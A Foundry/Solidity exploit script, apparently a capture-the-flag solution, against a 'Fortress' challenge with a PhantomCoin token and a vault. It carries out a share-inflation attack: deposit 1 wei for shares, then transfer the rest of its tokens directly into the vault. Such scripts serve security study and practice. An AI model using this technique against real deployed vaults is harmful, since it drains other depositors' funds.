// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Script.sol";
import "../src/Fortress.sol";
import "../src/Setup.sol";

contract Exploit is Script {
    function run() external {
        address setupAddress = 0x471502DC9D7354bCD4b8Acf52265855B077170C8;
        address walletAddress = 0x4f4828A65e133bB1bF9282632dAB4cBD85a3bc7f;

        vm.startBroadcast(walletAddress);

        // 1. Get Fortress instance
        Setup setup = Setup(setupAddress);
        Fortress fortress = Fortress(setup.challenge());
        address tokenAddress = fortress.token();
        PhantomCoin token = PhantomCoin(tokenAddress);

        // 2. Buy 1 ether of tokens
        token.buyTokens{value: 1 ether}();

        // 3. Approve vault to spend tokens
        address vaultAddress = fortress.vault();
        Vault vault = Vault(vaultAddress);
        token.approve(vaultAddress, type(uint256).max);

        // 4. Deposit 1 wei to get shares
        vault.deposit(1);

        // 5. Transfer ALL remaining tokens to the vault
        uint256 myBalance = token.balanceOf(walletAddress);
        token.transfer(vaultAddress, myBalance);

        // 6. Check if the challenge is solved
        bool solved = setup.isSolved();
        console.log("Challenge solved:", solved);
    }
}
